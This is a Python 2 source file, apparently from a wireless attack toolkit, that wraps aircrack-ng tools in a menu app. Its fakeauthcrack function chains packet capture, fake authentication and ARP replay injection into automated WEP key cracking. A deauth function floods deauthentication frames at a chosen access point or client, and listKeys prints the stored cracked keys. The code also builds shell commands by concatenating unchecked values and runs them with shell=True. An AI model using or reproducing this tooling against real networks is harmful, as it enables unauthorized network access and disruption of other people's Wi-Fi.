#!/usr/bin/env python

import string
import os

from inspect import isfunction, ismethod
from subprocess import Popen,PIPE,call

import grooconfig
from grooconfig import groo_root,airtools_root
from grooserv import model
from pywifi import pywifi_scan,pywifi_parseClient  

import termios, sys, time

if sys.version > "2.1" : TERMIOS = termios
else : import TERMIOS

import traceback
def formatExceptionInfo(maxTBlevel=5):
    cla, exc, trbk = sys.exc_info()
    excName = cla.__name__
    try:
        excArgs = exc.__dict__["args"]
    except KeyError:
        excArgs = "<no args>"
        excTb = traceback.format_tb(trbk, maxTBlevel)
        return (excName, excArgs, excTb)

class Menu:
    def __init__(self, title, menuitems, prompt='%>', 
                 fill='-', stag='<-', etag='->', numLines=True):
        self.title = title
        self.menuitems = menuitems
        self.prompt = prompt
        self.transitions = {}
        self.fill = fill
        self.stag = stag
        self.etag = etag
        self.environs = {}
        self.numberLines = numLines
        
        self.maxlen = len(title)
        for i in range(len(menuitems)):
            t = len(menuitems[i][0]) + len(str(i)) + 2 
            if t > self.maxlen:
                self.maxlen = t
                
        emptyline = self.makeLine("")
        
        self.menu  = emptyline
        self.menu += '\n' + self.makeLine(self.title)
        self.menu += '\n' + emptyline
        for j in range(len(self.menuitems)):
            if self.numberLines == True:
                self.menu += '\n' + self.makeLine( str(j+1)+') '+ self.menuitems[j][0] )
                if len(self.menuitems[j]) == 2:
                    self.addTransition( str(j+1), self.menuitems[j][1] )
                elif len(self.menuitems[j]) == 3:
                    self.addTransition( str(j+1), self.menuitems[j][1], env=self.menuitems[j][2] )
            else:
                self.menu += '\n' + self.makeLine( self.menuitems[j] )

        self.menu += '\n' + emptyline            
      
        self.addTransition('m', ['mainmenu'])
        self.addTransition('q', ['QUIT'])
        
    def makeLine(self, text):
        tws  = self.maxlen - len(text)
        line = self.stag
        line += text
        for i in range(tws):
            line += self.fill
        line += self.etag
        return line

    def addTransition(self, onthis, gohere, env=None):
        self.transitions[onthis] = gohere
        if env != None:
            self.environs[onthis] = env

    def transition(self, t):
        try:
            x = self.transitions[t]
            try:
                e = self.environs[t]
                return (x, e)
            except KeyError:
                return (x, None)
        except KeyError:
            return (None, None)

    def display(self):
        print '\n' + self.menu
        sys.stdout.write( self.prompt )
    
class MenuApp:
    def __init__(self):
        self.menus = {}
        self.env = {}
        
        self.hardcopies = {}
        self.hardcopyReady = None
        
        self.shellResult = None
        
        self.ECHO = 1;
        
    def startMenu(self, start):
        self.currentmenu = start
        
    def addMenu(self, menuname, menu):
        self.menus[menuname] = menu
      
    def currentMenu(self):
        return self.menus[self.currentmenu]
        
    def shell_exec(self, cmd):
        try:
            #retval = call(cmd, shell=True)
            self.shellResult = Popen(cmd, shell=True, stdout=PIPE).communicate()[0]
        except OSError:
            print 'OSError: '+cmd
        except:
            print formatExceptionInfo()
     
    def detachNewScreen(self, name, cmd):
        # Only allow one screen of this name 
        if self.searchScreen(name):
            return
    
        x = cmd.find("$")
        while x > 0:
            sx = x+1
            while sx < len(cmd) and cmd[sx:sx+1].isalnum():
                sx += 1
            vx = cmd[x+1:sx]
            if self.env.has_key(vx):
                cmd = cmd[:x] + self.env[vx] + cmd[sx:]
            else:
                print 'FAILED TO FIND VARIABLE: '+vx
            x = cmd.find("$", x+1)
        
        cmd = 'screen -UdmS '+name+' bash -c \" ' + cmd + ' \"'
        print cmd
        retval = call(cmd, shell=True)
                       
    def reattachToScreen(self, name):
        retval = call('screen -r '+name, shell=True)
        
    def hardcopyScreen(self, name):
        hcpath = groo_root+'/screens/'+name
        cmdstr = 'screen -S '+name+' -p 0 -X hardcopy '+hcpath
        
        call(cmdstr, shell=True)
        self.hardcopies[name] = hcpath
        
        # This method would avoid writing a file, 
        # but screen -X hardcopy is buggy so no go
        #self.hardcopies[name] \
        #    = Popen(cmdstr, shell=True, stdout=PIPE).communicate()[0]
        
        self.hardcopyReady = name
        
    def searchScreen(self, name):
        output = Popen("screen -S "+name+" -ls | wc -l", shell=True, stdout=PIPE).communicate()[0]
        if int(output) > 2:
            return True
        return False
    
    def textModeHandler(self, gohere):
        chunks = string.split(gohere, ":")     
        command = chunks[0]
        
        if command == 'QUIT':
            termios.tcsetattr(fd, TERMIOS.TCSADRAIN, self.oldSettings)
            exit(0)
            
        elif command == 'SHELL':
            self.shell_exec( gohere[6:] )
        
        elif command == 'SCREEN':
            self.detachNewScreen( chunks[1], chunks[2] ) 
            
        elif command == 'ATTACH':
            self.reattachToScreen( chunks[1] )
            
        elif self.menus.has_key(gohere):                                
            self.currentmenu = gohere
    
    def webModeHandler(self, gohere):
        chunks = string.split(gohere, ":")     
        command = chunks[0]
        
        #QUIT is meaningless atm. maybe logout?
            
        if command == 'SHELL':
            self.shell_exec( gohere[6:] )
        
        elif command == 'SCREEN':
            self.detachNewScreen( chunks[1], chunks[2] ) 
            
        elif command == 'ATTACH':
            self.hardcopyScreen( chunks[1] )
            
        elif self.menus.has_key(gohere):                                
            self.currentmenu = gohere
    
    def processTransition(self, menu, strkey, handler):
        (cmds, env) = menu.transition(strkey)
        
        if cmds == None:
            return
        
        if env and len(env) > 0:
            self.env.update(env)
        try:
            for gohere in cmds:
                if isfunction(gohere) or ismethod(gohere):
                    #print gohere
                    gohere(self)
                elif gohere and len(gohere) > 0:
                    handler(gohere)
                    
        except:
            if self.ECHO == 1:
                print formatExceptionInfo()    

    def listKeys(self, *args):
        strbuf = ''
        results = model.GrooHosts.select()
        for result in results:
            strbuf += 'essid: '+result.essid
            strbuf += ' bssid: ' +result.bssid
            strbuf += ' key: '+result.key
        self.shellResult = strbuf

    def fakeauthcrack(self, *args):
        try:
            channel = self.env['channel']
            essid   = self.env['essid']
            bssid   = self.env['bssid']
            ath     = self.env['IF0']
            mac     = self.env['MAC']
        except KeyError:
            print 'MISSING VARIABLES!!!'
            return
        
        
        dumpdir = grooconfig.dumpDirectory

        call('rm -f '+dumpdir+'/dump*', shell=True)      
        call('rm -f '+dumpdir+'/replay*', shell=True)
        print 'Resetting to channel '+channel
        call(groo_root+'scripts/config_ath.sh '+channel, shell=True)
        
        dumpcmd = 'cd '+dumpdir+';'+airtools_root+'airodump-ng -c '+channel+' -b '+bssid+' -w dump '+ath
        self.detachNewScreen('dump', dumpcmd)

        authcmd = 'cd '+dumpdir+';'+airtools_root+'aireplay-ng -1 0 -e '+essid+' -a '+bssid+' -h '+mac+' '+ath+';'+\
             'sleep 5;'+\
             airtools_root+'aireplay-ng -3 -b '+bssid+' -h '+mac+' '+ath
        self.detachNewScreen('auth', authcmd)

        crackcmd = 'sleep 5;'+\
             groo_root+'scripts/crack_until_it_works.sh '+\
             essid+' '+bssid+' '+groo_root+' '+airtools_root+ ';read x'
        self.detachNewScreen('crack', crackcmd)
        

    def deauth( self, *args ):
        try:
            essid   = self.env['essid']
            bssid   = self.env['bssid']
            ath     = self.env['IF0']
        except KeyError:
            print 'MISSING VARIABLES!!!'
            return
    
        print 'Deauth Flooding...'
        clientmac = pywifi_parseClient( essid, grooconfig.dumpDirectory+'/dump-01.txt' )
        if clientmac:
            call(airtools_root+'aireplay-ng -0 5 -a '+bssid+' -c '+clientmac+' '+ath, shell=True)
        else:    
            call(airtools_root+'aireplay-ng -0 5 -a '+bssid+' '+ath, shell=True)

    def rescan( self, key ):
        print 'Scanning...'
        scan_list = pywifi_scan()
        mitems = []
        maxlen = -1
        for item in scan_list:
            if item.has_key('essid'):
                l = len(item['essid'])
                if l > maxlen:
                    maxlen = l
        for x in range(len(scan_list)):
            if scan_list[x].has_key('essid'):
                mi = scan_list[x]['essid']
                lmi = len(mi)
                for j in range(maxlen - lmi):
                   mi += ' '
                mi += '(' + scan_list[x]['bssid']+')'
                mitems.append((mi,key,scan_list[x]))
        return mitems
    
    def runTextMode(self):
        fd = sys.stdin.fileno()
        self.oldSettings = termios.tcgetattr(fd)
        new = termios.tcgetattr(fd)
        new[3] = new[3] & ~TERMIOS.ECHO # lflags
        new[3] = new[3] & ~TERMIOS.ICANON # lflags
        new[6][6] = '\000' # Set VMIN to zero for lookahead only
        termios.tcsetattr(fd, TERMIOS.TCSADRAIN, new)

        try:
            menu = self.menus[self.currentmenu]
            menu.display()

            while(1):
                if menu:
                    nitems = len(menu.menuitems)
                    digits = (nitems / 10) + 1
                    timeout = 100000
                    strkey = ''
                    while digits > 0 and timeout > 0:
                        key = sys.stdin.read(1)
                        timeout = timeout - 1
                        if key.isalnum():
                            strkey = strkey + str(key)
                            digits = digits - 1
                        
                    if len(strkey) > 0:
                        ret = processTransition(menu, strkey, textModeHandler)             
                        menu = self.menus[self.currentmenu]                       
                        menu.display()

        except:
            if self.ECHO == 1:
                print formatExceptionInfo()
            
        finally:
            termios.tcsetattr(fd, TERMIOS.TCSADRAIN, self.oldSettings)
            exit(0)
